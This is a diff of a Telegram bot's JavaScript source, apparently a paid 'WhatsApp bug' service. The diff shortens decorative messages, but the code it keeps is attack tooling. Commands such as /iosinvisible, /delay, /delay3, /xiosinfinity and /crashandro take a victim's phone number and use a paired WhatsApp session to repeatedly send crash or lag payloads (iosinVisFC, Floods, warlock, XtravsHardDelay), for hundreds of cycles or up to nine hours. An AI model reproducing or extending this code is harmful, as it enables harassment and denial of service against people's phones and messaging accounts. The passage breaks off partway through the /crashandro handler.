-    return sendWithBanner("🚫 Only Developer SHADOW OFFICIAL can use this command!");
+    return sendWithBanner("Only Developer SHADOW OFFICIAL can use this command!");
   }
-
   if (!userId) {
-    return sendWithBanner(`
-┌─❖ *Remove Premium User* ❖┐
-│                           
-│  Please provide a         
-│  valid user ID            
-│  (e.g., /delprem 1234567890)           
-│               
-│                           
-└──────────────┬───────────┘
-                │
-*POWERED BY SHADOW OFFICIAL*
-    `);
+    return sendWithBanner("Please provide a valid user ID (e.g., /delprem 1234567890)");
   }
-
   if (!userId.match(/^\d+$/)) {
-    return sendWithBanner(`
-┌─❖ *Invalid User ID* ❖┐
-│                       
-│  Please provide a     
-│  valid numeric user   
-│  ID (e.g., 1234567890)
-│                       
-└──────────────┬───────┘
-                │
-*POWERED BY SHADOW OFFICIAL*
-    `);
+    return sendWithBanner("Please provide a valid numeric user ID (e.g., 1234567890)");
   }
-
   if (!premiumUsers.includes(userId)) {
-    return sendWithBanner(`
-┌─❖ *User Not Premium* ❖┐
-│                        
-│  User ID ${userId} is     
-│  not a premium user.    
-│                        
-└──────────────┬─────────┘
-                │
-*POWERED BY SHADOW OFFICIAL*
-    `);
+    return sendWithBanner(`User ID ${userId} is not a premium user.`);
   }
-
   premiumUsers = premiumUsers.filter((id) => id !== userId);
   savePremiumUsers();
-
-  return sendWithBanner(`
-┌─❖ *Premium User Removed* ❖┐
-│                            
-│  User ID ${userId} has      
-│  been removed from         
-│  premium users!            
-│                            
-└──────────────┬─────────────┘
-                │
-*POWERED BY SHADOW OFFICIAL*
-  `);
+  return sendWithBanner(`Premium User Removed: User ID ${userId} has been removed from premium users!`);
 });
 
-
-
-// ──────────────── Request Pairing Command (UNLIMITED PAIRING + 3 SEC GLOBAL PAUSE) ────────────────
 bot.onText(/\/reqpair(?:\s*(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const telegramId = msg.from.id.toString();
   const botNumberRaw = match[1] ? match[1].trim() : null;
-
-  // Premium check
   if (!isPremium(telegramId)) {
-    return bot.sendMessage(chatId, "🚫 You are not a premium user. Please contact the owner to buy premium access. @shadow_official");
+    return bot.sendMessage(chatId, "You are not a premium user. Please contact the owner to buy premium access. @shadow_official");
   }
-
-  // Must provide a number
   if (!botNumberRaw) {
-    return bot.sendMessage(
-      chatId,
-      "┌─❖ *Request Pairing* ❖─┐\n" +
-      "│ Please provide a number\n" +
-      "│ in International format\n" +
-      "│ /reqpair 92xxx\n" +
-      "└──────────────┬────────┘\n" +
-      "                │\n" +
-      "*POWERED BY SHADOW OFFICIAL*",
-      { parse_mode: "Markdown" }
-    );
+    return bot.sendMessage(chatId, "Request Pairing: Please provide a number in International format /reqpair 92xxx", { parse_mode: "Markdown" });
   }
-
-  // Normalize → digits only
   const botNumber = botNumberRaw.replace(/\D/g, "");
   if (!botNumber) {
-    return bot.sendMessage(chatId, "❌ Invalid number.");
+    return bot.sendMessage(chatId, "Invalid number.");
   }
-
   try {
-    // --- Connect to WhatsApp and generate pairing code immediately ---
     const socket = await connectToWhatsApp(botNumber, chatId);
-
     if (!socket) {
-      return bot.sendMessage(
-        chatId,
-        "┌─❖ *Connection Error* ❖─┐\n" +
-        "│ WhatsApp pairing failed.\n" +
-        "└──────────────┬──────────┘\n" +
-        "                │\n" +
-        "*POWERED BY SHADOW OFFICIAL*",
-        { parse_mode: "Markdown" }
-      );
+      return bot.sendMessage(chatId, "Connection Error: WhatsApp pairing failed.", { parse_mode: "Markdown" });
     }
-
-    // --- GLOBAL PAUSE 3 SECONDS ---
-    console.log("⏳ Pausing all bot processes for 3 seconds...");
+    console.log("Pausing all bot processes for 3 seconds...");
     await new Promise(resolve => setTimeout(resolve, 3500));
-    console.log("▶️ Resuming bot processes after pause.");
-
-    // --- Continue normal pairing updates ---
+    console.log("Resuming bot processes after pause.");
     const existing = userPairs.find(p => p.telegramId === telegramId);
     if (existing) {
       existing.whatsappNumber = botNumber;
     } else {
       userPairs.push({ telegramId, whatsappNumber: botNumber });
     }
-
-    // Update pairedUsers safely
     const normalized = pairedUsers.map(n => n.replace(/\D/g, ""));
     if (!normalized.includes(botNumber)) {
       pairedUsers.push(botNumber);
     }
-
-    // Save JSON
     fs.writeFileSync("./user_pairs.json", JSON.stringify(userPairs, null, 2));
     savePairedUsers();
-
-    // ❌ No success message, silent finish
     return;
-
   } catch (err) {
     console.error(err);
-    return bot.sendMessage(
-      chatId,
-      "┌─❖ *Connection Error* ❖─┐\n" +
-      "│ WhatsApp pairing failed.\n" +
-      "└──────────────┬──────────┘\n" +
-      "                │\n" +
-      "*POWERED BY SHADOW OFFICIAL*",
-      { parse_mode: "Markdown" }
-    );
+    return bot.sendMessage(chatId, "Connection Error: WhatsApp pairing failed.", { parse_mode: "Markdown" });
   }
 });
 
-// ──────────────── Handler: /iosinvisible ───────────────
 bot.onText(/\/iosinvisible(?:\s*(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id.toString();
   const input = match[1] ? match[1].trim() : null;
   const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';
-
   const sendWithBanner = async (text) => {
-    await bot.sendPhoto(chatId, bannerImage, {
-      caption: text,
-      parse_mode: "Markdown"
-    });
+    await bot.sendPhoto(chatId, bannerImage, { caption: text, parse_mode: "Markdown" });
   };
-
-  // ─── 1. PREMIUM CHECK ───
   if (!isPremium(userId)) {
-    return sendWithBanner(`╭─❖ Access Denied ❖─╮
-│ 🚫 Not a premium user
-│
-│ Please contact owner
-│ for premium access
-╰───────────────────╯`);
+    return sendWithBanner("Access Denied: Not a premium user. Please contact owner for premium access");
   }
-
-  // ─── 2. CHECK IF USER HAS PAIRED ANY NUMBER ───
   const pairedEntry = userPairs.find(u => u.telegramId === userId);
-
   if (!pairedEntry) {
-    return sendWithBanner(`╔══❖ NO PAIRED NUMBER ❖══╗
-║ 📵 WhatsApp not linked
-║
-║ No active number found.
-║ Pair a number first
-║ using /reqpair
-╚═══════════════════════╝`);
+    return sendWithBanner("NO PAIRED NUMBER: WhatsApp not linked. No active number found. Pair a number first using /reqpair");
   }
-
   const pairedNumber = pairedEntry.whatsappNumber;
-
-  // ─── 3. CHECK ACTIVE SESSION FOR PAIRED NUMBER ───
   if (!sessions.has(pairedNumber)) {
-    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
-║
-║ ⚠ Your WhatsApp session
-║   is not active.
-║
-║ 🔄 Please pair again:
-║   /reqpair
-╚═════════════════════════╝`);
+    return sendWithBanner("SOMETHING WENT WRONG: Your WhatsApp session is not active. Please pair again: /reqpair");
   }
-
   const sock = sessions.get(pairedNumber);
-
-  // ─── 4. TARGET NUMBER VALIDATION ───
   if (!input) {
-    return sendWithBanner(`╭─❖ iOS Invisible ❖─╮
-│
-│ ⚠ Please provide a
-│   valid phone number:
-│
-│ Example:
-│ /iosinvisible 92333xxxxxx
-│
-╰───────────────╯`);
+    return sendWithBanner("iOS Invisible: Please provide a valid phone number. Example: /iosinvisible 92333xxxxxx");
   }
-
   if (!input.match(/^\d{10,15}$/)) {
-    return sendWithBanner(`┌─❖ Invalid Number ❖─┐
-│
-│ ❌ Provide a valid
-│   international number.
-│
-│ Example: 923123456789
-│
-└─────────────┘`);
+    return sendWithBanner("Invalid Number: Provide a valid international number. Example: 923123456789");
   }
-
   const target = `${input}@s.whatsapp.net`;
-
-  // ─── 5. MAIN BUG PROCESS ───
   try {
-
-    await sendWithBanner(`┌─❖ Bug Started ❖─┐
-│
-│ ✅ iOS Invisible sent to ${input}
-│
-└─────────────┘`);
-
+    await sendWithBanner(`Bug Started: iOS Invisible sent to ${input}`);
     for (let i = 0; i < 50; i++) {
       await iosinVisFC(sock, target);
       await sleep(500);
       await iosinVisFC(sock, target);
       await sleep(500);
-            
-     
-      console.log(chalk.blueBright(`⚡ [${i + 1}/50] Sent to ${target}`));
+      console.log(chalk.blueBright(`[${i + 1}/50] Sent to ${target}`));
       await sleep(1000);
     }
-
-    return sendWithBanner(`┌─❖ iOS Invisible Done ❖─┐
-│ ✅ Completed for ${input}
-└─────────────┘`);
-
+    return sendWithBanner(`iOS Invisible Done: Completed for ${input}`);
   } catch (err) {
     console.error("Error in /iosinvisible:", err);
-
-    return sendWithBanner(`╭─❖ Something Went Wrong ❖─╮
-│
-│ ⚠️ Process stopped.
-│   Please pair again:
-│   /reqpair
-│
-╰─────────────────────╯`);
+    return sendWithBanner("Something Went Wrong: Process stopped. Please pair again: /reqpair");
   }
 });
 
-// ──────────────── Handler: /delay ────────────────
 bot.onText(/\/delay(?:\s*(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id.toString();
   const input = match[1] ? match[1].trim() : null;
   const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';
-
   const sendWithBanner = async (text) => {
-    await bot.sendPhoto(chatId, bannerImage, {
-      caption: text,
-      parse_mode: "Markdown"
-    });
+    await bot.sendPhoto(chatId, bannerImage, { caption: text, parse_mode: "Markdown" });
   };
-
-  // ─── 1. PREMIUM CHECK ───
   if (!isPremium(userId)) {
-    return sendWithBanner(`╔═❖ ACCESS DENIED ❖═╗
-║
-║ ⚠ YOU ARE NOT A PREMIUM USER
-║ CONTACT OWNER TO GET ACCESS
-║@shadow_official
-╚═════════════════════╝`);
+    return sendWithBanner("ACCESS DENIED: YOU ARE NOT A PREMIUM USER. CONTACT OWNER TO GET ACCESS @shadow_official");
   }
-
-  // ─── 2. USER MUST HAVE A PAIRED WHATSAPP NUMBER ───
   const pairedEntry = userPairs.find(u => u.telegramId === userId);
-
   if (!pairedEntry) {
-    return sendWithBanner(`╔═❖ NO PAIRED NUMBER ❖═╗
-║
-║ ⚠ YOU HAVE NOT PAIRED ANY WHATSAPP NUMBER
-║ USE /REQPAIR FIRST
-║
-╚═════════════════════╝`);
+    return sendWithBanner("NO PAIRED NUMBER: YOU HAVE NOT PAIRED ANY WHATSAPP NUMBER. USE /REQPAIR FIRST");
   }
-
   const pairedNumber = pairedEntry.whatsappNumber;
-
-  // ─── 3. CHECK ACTIVE SESSION FOR PAIRED NUMBER ───
   if (!sessions.has(pairedNumber)) {
-    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
-║
-║ ⚠ YOUR WHATSAPP SESSION IS NOT ACTIVE
-║ PLEASE PAIR AGAIN:
-║ /REQPAIR
-║
-╚═════════════════════════╝`);
+    return sendWithBanner("SOMETHING WENT WRONG: YOUR WHATSAPP SESSION IS NOT ACTIVE. PLEASE PAIR AGAIN: /REQPAIR");
   }
-
   const sock = sessions.get(pairedNumber);
-
-  // ─── 4. TARGET NUMBER VALIDATION ───
   if (!input) {
-    return sendWithBanner(`╔═❖ SILENT DELAY ❖═╗
-║
-║ ⚠ PROVIDE A VALID PHONE NUMBER
-║
-║ USAGE:
-║ /delay 92333XXXXXX
-║
-╚═════════════════════╝`);
+    return sendWithBanner("SILENT DELAY: PROVIDE A VALID PHONE NUMBER. USAGE: /delay 92333XXXXXX");
   }
-
   if (!input.match(/^\d{10,15}$/)) {
-    return sendWithBanner(`╔═❖ INVALID NUMBER ❖═╗
-║
-║ ⚠ PROVIDE A VALID
-║   INTERNATIONAL NUMBER
-║
-║ EXAMPLE:
-║ 923123456789
-║
-╚═════════════════════╝`);
+    return sendWithBanner("INVALID NUMBER: PROVIDE A VALID INTERNATIONAL NUMBER. EXAMPLE: 923123456789");
   }
-
   const target = `${input}@s.whatsapp.net`;
-
-  // ─── 5. MAIN BUG PROCESS ───
   try {
-
-    await sendWithBanner(`╔═❖ delay STARTED ❖═╗
-║
-║ Bug sending to:
-║ ${input}
-║
-╚═══════════════════════╝`);
-
+    await sendWithBanner(`delay STARTED: Bug sending to: ${input}`);
     for (let i = 0; i < 300; i++) {
-
       await SilentLatency(sock, target);
       await sleep(1000);
-
-      console.log(chalk.green(`⚡ [${i + 1}/300] delay sent to ${target}`));
+      console.log(chalk.green(`[${i + 1}/300] delay sent to ${target}`));
       await sleep(1800);
     }
-
-    return sendWithBanner(`╔═❖ delay DONE ❖═╗
-║
-║ Completed for:
-║ ${input}
-║
-╚═════════════════════╝`);
-
+    return sendWithBanner(`delay DONE: Completed for: ${input}`);
   } catch (err) {
     console.error("Error in /delay:", err);
-
-    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
-║
-║ Process stopped.
-║ Please pair again:
-║ /reqpair
-║
-╚═════════════════════╝`);
+    return sendWithBanner("SOMETHING WENT WRONG: Process stopped. Please pair again: /reqpair");
   }
 });
 
-
-// ──────────────── Handler: /delay2───────────────
 bot.onText(/\/delay2(?:\s*(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id.toString();
   const input = match[1] ? match[1].trim() : null;
   const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';
-
   const sendWithBanner = async (text) => {
-    await bot.sendPhoto(chatId, bannerImage, {
-      caption: text,
-      parse_mode: "Markdown"
-    });
+    await bot.sendPhoto(chatId, bannerImage, { caption: text, parse_mode: "Markdown" });
   };
-
-  // ─── 1. PREMIUM CHECK ───
   if (!isPremium(userId)) {
-    return sendWithBanner(`╔═❖ ACCESS DENIED ❖═╗
-║
-║ You are not a
-║ premium user.
-║
-║ Contact owner to get
-║ premium access. @shadow_official
-║
-╚═════════════════╝`);
+    return sendWithBanner("ACCESS DENIED: You are not a premium user. Contact owner to get premium access. @shadow_official");
   }
-
-  // ─── 2. USER MUST HAVE A PAIRED WHATSApp NUMBER ───
   const pairedEntry = userPairs.find(u => u.telegramId === userId);
-
   if (!pairedEntry) {
-    return sendWithBanner(`╔═❖ NO PAIRED NUMBER ❖═╗
-║
-║ You have not paired
-║ any WhatsApp number.
-║
-║ Use /reqpair first.
-║
-╚═════════════════╝`);
+    return sendWithBanner("NO PAIRED NUMBER: You have not paired any WhatsApp number. Use /reqpair first.");
   }
-
   const pairedNumber = pairedEntry.whatsappNumber;
-
-  // ─── 3. CHECK ACTIVE SESSION ───
   if (!sessions.has(pairedNumber)) {
-    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
-║
-║ Your WhatsApp session
-║ is not active.
-║
-║ Please pair again:
-║ /reqpair
-║
-╚═════════════════╝`);
+    return sendWithBanner("SOMETHING WENT WRONG: Your WhatsApp session is not active. Please pair again: /reqpair");
   }
-
   const sock = sessions.get(pairedNumber);
-
-  // ─── 4. TARGET NUMBER VALIDATION ───
   if (!input) {
-    return sendWithBanner(`╔═❖ delay2 ❖═╗
-║
-║ Provide a valid
-║ phone number:
-║
-║ /delay2 92333xxxxxx
-║
-╚═══════════════╝`);
+    return sendWithBanner("delay2: Provide a valid phone number: /delay2 92333xxxxxx");
   }
-
   if (!input.match(/^\d{10,15}$/)) {
-    return sendWithBanner(`╔═❖ INVALID NUMBER ❖═╗
-║
-║ Provide a valid
-║ international number.
-║
-║ e.g., 923123456789
-║
-╚═══════════════╝`);
+    return sendWithBanner("INVALID NUMBER: Provide a valid international number. e.g., 923123456789");
   }
-
   const target = `${input}@s.whatsapp.net`;
-
-  // ─── 5. MAIN BUG PROCESS ───
   try {
-
-    await sendWithBanner(`╔═❖ delay2 STARTED ❖═╗
-║
-║ Sending bug to:
-║ ${input}
-║
-╚═════════════════╝`);
-
-    console.log(chalk.blue(`🔥 delay2 sending to ${target}...`));
-
+    await sendWithBanner(`delay2 STARTED: Sending bug to: ${input}`);
+    console.log(chalk.blue(`delay2 sending to ${target}...`));
     for (let i = 0; i < 200; i++) {
-
       await Floods(sock, target);
       await sleep(400);
-
       await warlock(sock, target, true);
       await sleep(300);
-      
       await XtravsHardDelay(sock, target);
       await sleep(500);
-
-      console.log(chalk.blueBright(`⚡ [${i + 1}/200] SHADOW OFFICIALCore sent to ${target}`));
+      console.log(chalk.blueBright(`[${i + 1}/200] SHADOW OFFICIALCore sent to ${target}`));
     }
-
-    return sendWithBanner(`╔═❖ delay2 DONE ❖═╗
-║
-║ Completed for:
-║ ${input}
-║
-╚═════════════════╝`);
-
+    return sendWithBanner(`delay2 DONE: Completed for: ${input}`);
   } catch (err) {
     console.error("Error in /delay2:", err);
-
-    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
-║
-║ Process stopped.
-║ Please pair again:
-║ /reqpair
-║
-╚═════════════════════╝`);
+    return sendWithBanner("SOMETHING WENT WRONG: Process stopped. Please pair again: /reqpair");
   }
 });
 
-
-
-
-// ──────────────── Handler: /delay3 ────────────────
 bot.onText(/\/delay3\s+(\d{10,15})\s+(\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id.toString();
-  const input = match[1];          // number (MANDATORY)
-  const hours = parseInt(match[2]); // hours (MANDATORY)
+  const input = match[1];
+  const hours = parseInt(match[2]);
   const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';
-
   const sendWithBanner = async (text) => {
-    await bot.sendPhoto(chatId, bannerImage, {
-      caption: text,
-      parse_mode: "Markdown"
-    });
+    await bot.sendPhoto(chatId, bannerImage, { caption: text, parse_mode: "Markdown" });
   };
-
-  // ─── 1. PREMIUM CHECK ───
   if (!isPremium(userId)) {
-    return sendWithBanner(`╔═❖ ACCESS DENIED ❖═╗
-║
-║ You are not a
-║ premium user.
-║
-║ Contact owner to get
-║ premium access. @shadow_official
-║
-╚═══════════════════╝ V`);
+    return sendWithBanner("ACCESS DENIED: You are not a premium user. Contact owner to get premium access. @shadow_official V");
   }
-
-  // ─── 2. HOURS VALIDATION ───
   if (isNaN(hours) || hours < 1 || hours > 9) {
-    return sendWithBanner(`╔═❖ delay3 ❖═╗
-║
-║ Usage:
-║ /delay3 <number> <hours>
-║
-║ Example:
-║ /delay3 923001112233 2
-║
-║ Hours Range:
-║ 1 - 9 only
-║
-╚═══════════════════╝ V2`);
+    return sendWithBanner("delay3: Usage: /delay3 <number> <hours>. Example: /delay3 923001112233 2. Hours Range: 1 - 9 only V2");
   }
-
-  // ─── 3. USER MUST HAVE A PAIRED WHATSAPP NUMBER ───
   const pairedEntry = userPairs.find(u => u.telegramId === userId);
   if (!pairedEntry) {
-    return sendWithBanner(`╔═❖ NO PAIRED NUMBER ❖═╗
-║
-║ You have not paired
-║ any WhatsApp number.
-║
-║ Use /reqpair first.
-║
-╚═══════════════════╝ V2`);
+    return sendWithBanner("NO PAIRED NUMBER: You have not paired any WhatsApp number. Use /reqpair first. V2");
   }
-
   const pairedNumber = pairedEntry.whatsappNumber;
-
-  // ─── 4. ACTIVE SESSION CHECK ───
   if (!sessions.has(pairedNumber)) {
-    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
-║
-║ Your WhatsApp session
-║ is not active.
-║
-║ Please pair again:
-║ /reqpair
-║
-╚═══════════════════════╝ V2`);
+    return sendWithBanner("SOMETHING WENT WRONG: Your WhatsApp session is not active. Please pair again: /reqpair V2");
   }
-
   const sock = sessions.get(pairedNumber);
   const target = `${input}@s.whatsapp.net`;
   const endTime = Date.now() + hours * 60 * 60 * 1000;
-
-  // ─── 5. MAIN EXECUTION ───
   try {
-
-    await sendWithBanner(`╔═❖ delay3 STARTED ❖═╗
-║
-║ Target:
-║ ${input}
-║
-║ Runtime:
-║ ${hours} Hour(s)
-║
-╚══════════════════════╝ V2`);
-
-    console.log(chalk.blue(`🔥 delay3 started for ${hours}h → ${target}`));
-
+    await sendWithBanner(`delay3 STARTED: Target: ${input}, Runtime: ${hours} Hour(s) V2`);
+    console.log(chalk.blue(`delay3 started for ${hours}h -> ${target}`));
     let cycle = 0;
-
     while (Date.now() < endTime) {
-
       await Floods(sock, target, true);
       await sleep(500);
-
       await warlock(sock, target);
       await sleep(500);
-
       await XtravsHardDelay(sock, target);
       await sleep(500);
-
-      console.log(chalk.blueBright(`⚡ Cycle ${++cycle} executed → ${target}`));
+      console.log(chalk.blueBright(`Cycle ${++cycle} executed -> ${target}`));
     }
-
-    return sendWithBanner(`╔═❖ delay3 COMPLETED ❖═╗
-║
-║ Target:
-║ ${input}
-║
-║ Total Runtime:
-║ ${hours} Hour(s)
-║
-╚══════════════════════╝ V2`);
-
+    return sendWithBanner(`delay3 COMPLETED: Target: ${input}, Total Runtime: ${hours} Hour(s) V2`);
   } catch (err) {
     console.error("Error in /delay3:", err);
-
-    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
-║
-║ Process stopped.
-║ Please pair again:
-║ /reqpair
-║
-╚══════════════════════╝ V2`);
+    return sendWithBanner("SOMETHING WENT WRONG: Process stopped. Please pair again: /reqpair V2");
   }
 });
 
-
-
-// ──────────────── Handler: /xiosinfinity ────────────────
 bot.onText(/\/xiosinfinity(?:\s*(\d+)\s*(\d+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id.toString();
   const input = match[1] ? match[1].trim() : null;
   const hours = match[2] ? parseInt(match[2]) : null;
   const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';
-
   const sendWithBanner = async (text) => {
-    await bot.sendPhoto(chatId, bannerImage, {
-      caption: text,
-      parse_mode: "Markdown"
-    });
+    await bot.sendPhoto(chatId, bannerImage, { caption: text, parse_mode: "Markdown" });
   };
-
-  // ─── 1. PREMIUM CHECK ───
   if (!isPremium(userId)) {
-    return sendWithBanner(`
-╔═❖ ACCESS DENIED ❖═╗
-║
-║ You are not a
-║ premium user.
-║
-║ Contact owner to get
-║ premium access. @shadow_official
-║
-╚═══════════════════╝ V2`);
+    return sendWithBanner("ACCESS DENIED: You are not a premium user. Contact owner to get premium access. @shadow_official V2");
   }
-
-  // ─── 2. USER MUST HAVE A PAIRED WHATSAPP NUMBER ───
   const pairedEntry = userPairs.find(u => u.telegramId === userId);
-
   if (!pairedEntry) {
-    return sendWithBanner(`
-╔═❖ NO PAIRED NUMBER ❖═╗
-║
-║ You have not paired
-║ any WhatsApp number.
-║
-║ Use /reqpair first.
-║
-╚═════════════════════╝ V2`);
+    return sendWithBanner("NO PAIRED NUMBER: You have not paired any WhatsApp number. Use /reqpair first. V2");
   }
-
   const pairedNumber = pairedEntry.whatsappNumber;
-
-  // ─── 3. ACTIVE SESSION CHECK ───
   if (!sessions.has(pairedNumber)) {
-    return sendWithBanner(`╔═❖ NO ACTIVE SESSION ❖═╗
-║
-║ Your WhatsApp session
-║ is not active.
-║
-║ Please pair again:
-║ /reqpair
-║
-╚═════════════════════╝ V2`);
+    return sendWithBanner("NO ACTIVE SESSION: Your WhatsApp session is not active. Please pair again: /reqpair V2");
   }
-
   const sock = sessions.get(pairedNumber);
-
-  // ─── 4. INPUT VALIDATION ───
   if (!input || !hours || isNaN(hours) || hours < 1 || hours > 9) {
-    return sendWithBanner(`
-╔═❖ XIOS INFINITY ❖═╗
-║
-║ Usage:
-║ /xiosinfinity <number> <hours>
-║
-║ Example:
-║ /xiosinfinity 923001112233 3
-║
-║ Hours Range:
-║ 1 - 9 only
-║
-╚═════════════════════╝ V2`);
+    return sendWithBanner("XIOS INFINITY: Usage: /xiosinfinity <number> <hours>. Example: /xiosinfinity 923001112233 3. Hours Range: 1 - 9 only V2");
   }
-
-  // ─── 5. NUMBER VALIDATION ───
   if (!input.match(/^\d{10,15}$/)) {
-    return sendWithBanner(`
-╔═❖ INVALID NUMBER ❖═╗
-║
-║ Provide a valid
-║ international number.
-║
-║ Example:
-║ 923123456789
-║
-╚═════════════════════╝ V2`);
+    return sendWithBanner("INVALID NUMBER: Provide a valid international number. Example: 923123456789 V2");
   }
-
   const target = `${input}@s.whatsapp.net`;
   const duration = hours * 60 * 60 * 1000;
   const endTime = Date.now() + duration;
-
-  // ─── 6. MAIN EXECUTION ───
   try {
-
-    await sendWithBanner(`
-╔═❖ XIOS INFINITY STARTED ❖═╗
-║
-║ Target:
-║ ${input}
-║
-║ Runtime:
-║ ${hours} Hour(s)
-║
-╚═══════════════════════════╝ V2`);
-
-    console.log(chalk.blue(`🚀 XIOS Infinity started for ${hours}h → ${target}`));
-
+    await sendWithBanner(`XIOS INFINITY STARTED: Target: ${input}, Runtime: ${hours} Hour(s) V2`);
+    console.log(chalk.blue(`XIOS Infinity started for ${hours}h -> ${target}`));
     let cycle = 0;
-
     while (Date.now() < endTime) {
-
       await iosinVisFC(sock, target);
       await sleep(500);
-
       await iosinVisFC(sock, target);
       await sleep(1000);
-
-      console.log(chalk.blueBright(`⚡ XIOS Infinity Cycle ${++cycle} executed → ${target}`));
+      console.log(chalk.blueBright(`XIOS Infinity Cycle ${++cycle} executed -> ${target}`));
     }
-
-    return sendWithBanner(`
-╔═❖ XIOS INFINITY COMPLETED ❖═╗
-║
-║ Target:
-║ ${input}
-║
-║ Total Runtime:
-║ ${hours} Hour(s)
-║
-╚═════════════════════════════╝ V2`);
-
+    return sendWithBanner(`XIOS INFINITY COMPLETED: Target: ${input}, Total Runtime: ${hours} Hour(s) V2`);
   } catch (err) {
     console.error("Error in /xiosinfinity:", err);
-
-    return sendWithBanner(`
-╔═❖ EXECUTION FAILED ❖═╗
-║
-║ Something went wrong.
-║ Pair again:
-║ /reqpair
-║
-╚═════════════════════╝ V2`);
+    return sendWithBanner("EXECUTION FAILED: Something went wrong. Pair again: /reqpair V2");
   }
 });
 
-
-
-
-// ──────────────── Handler: /delay1 ────────────────
 bot.onText(/\/delay1(?:\s*(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id.toString();
   const input = match[1] ? match[1].trim() : null;
   const bannerImage = "https://files.catbox.moe/z2l1as.jpg";
-
   const sendWithBanner = async (text) => {
-    await bot.sendPhoto(chatId, bannerImage, {
-      caption: text,
-      parse_mode: "Markdown"
-    });
+    await bot.sendPhoto(chatId, bannerImage, { caption: text, parse_mode: "Markdown" });
   };
-
-  // ─── 1. PREMIUM CHECK ───
   if (!isPremium(userId)) {
-    return sendWithBanner(`
-╔═❖ ACCESS DENIED ❖═╗
-║
-║ You are not a premium user.
-║ Contact owner to get premium access. @shadow_official
-║
-╚══════════════════╝`);
+    return sendWithBanner("ACCESS DENIED: You are not a premium user. Contact owner to get premium access. @shadow_official");
   }
-
-  // ─── 2. USER MUST HAVE A PAIRED NUMBER ───
   const pairedEntry = userPairs.find(u => u.telegramId === userId);
-
   if (!pairedEntry) {
-    return sendWithBanner(`
-╔═❖ NO PAIRED NUMBER ❖═╗
-║
-║ You have not paired any WhatsApp number.
-║ Use /reqpair first.
-║
-╚═════════════════════╝`);
+    return sendWithBanner("NO PAIRED NUMBER: You have not paired any WhatsApp number. Use /reqpair first.");
   }
-
   const pairedNumber = pairedEntry.whatsappNumber;
-
-  // ─── 3. CHECK ACTIVE SESSION ───
   if (!sessions.has(pairedNumber)) {
-    return sendWithBanner(`
-╔═❖ NO ACTIVE SESSION ❖═╗
-║
-║ Your WhatsApp session is not active.
-║ Pair again using:
-║ /reqpair
-║
-╚═════════════════════╝`);
+    return sendWithBanner("NO ACTIVE SESSION: Your WhatsApp session is not active. Pair again using: /reqpair");
   }
-
   const sock = sessions.get(pairedNumber);
-
-  // ─── 4. TARGET NUMBER VALIDATION ───
   if (!input) {
-    return sendWithBanner(`
-╔═❖ delay1 ❖═╗
-║
-║ Usage:
-║ /delay1 92333xxxxxx
-║
-╚═════════════════╝`);
+    return sendWithBanner("delay1: Usage: /delay1 92333xxxxxx");
   }
-
   if (!input.match(/^\d{10,15}$/)) {
-    return sendWithBanner(`
-╔═❖ INVALID NUMBER ❖═╗
-║
-║ Provide a valid
-║ international number.
-║ e.g., 923123456789
-║
-╚════════════════════╝`);
+    return sendWithBanner("INVALID NUMBER: Provide a valid international number. e.g., 923123456789");
   }
-
   const target = `${input}@s.whatsapp.net`;
-
-  // ─── 5. MAIN DELAY QUOTA LOOP ───
   try {
-
-    await sendWithBanner(`
-╔═❖ delay1 STARTED ❖═╗
-║
-║ Sending delay1 to:
-║ ${input}
-║
-╚═══════════════════════╝`);
-
-    console.log(chalk.blue(`🚀 delay1 started on ${target}`));
-
+    await sendWithBanner(`delay1 STARTED: Sending delay1 to: ${input}`);
+    console.log(chalk.blue(`delay1 started on ${target}`));
     for (let i = 0; i < 200; i++) {
-      // Triple attack pattern
       await warlock(sock, target);
       await sleep(400);
-
       await Floods(sock, target, true);
       await sleep(300);
-      
-
-      console.log(chalk.blueBright(`⚡ [${i + 1}/200] delay1 sent to ${target}`));
+      console.log(chalk.blueBright(`[${i + 1}/200] delay1 sent to ${target}`));
     }
-
-    return sendWithBanner(`
-╔═❖ delay1 COMPLETED ❖═╗
-║
-║ Finished for:
-║ ${input}
-║
-╚═════════════════════════╝`);
-
+    return sendWithBanner(`delay1 COMPLETED: Finished for: ${input}`);
   } catch (err) {
     console.error("Error in /delay1:", err);
-
-    return sendWithBanner(`
-╔═❖ EXECUTION ERROR ❖═╗
-║
-║ Something went wrong.
-║ Pair again using:
-║ /reqpair
-║
-╚════════════════════╝`);
+    return sendWithBanner("EXECUTION ERROR: Something went wrong. Pair again using: /reqpair");
   }
 });
 
-
-
-// ──────────────── Handler: /crashandro ────────────────
 bot.onText(/\/crashandro(?:\s*(\d+)\s*(\d+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id.toString();
   const input = match[1] ? match[1].trim() : null;
   const hours = match[2] ? parseInt(match[2]) : null;
   const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';
-
   const sendWithBanner = async (text) => {
-    await bot.sendPhoto(chatId, bannerImage, {
-      caption: text,
-      parse_mode: "Markdown"
-    });
+    await bot.sendPhoto(chatId, bannerImage, { caption: text, parse_mode: "Markdown" });
   };
-
-  // ─── 1. PREMIUM CHECK ───
   if (!isPremium(userId)) {
-    return sendWithBanner(`
-╔═❖ ACCESS DENIED ❖═╗
-║
-║ You are not a premium user.
-║ Contact the owner to get
-║ premium access. @shadow_official
-║
-╚════════════════════╝ V2`);
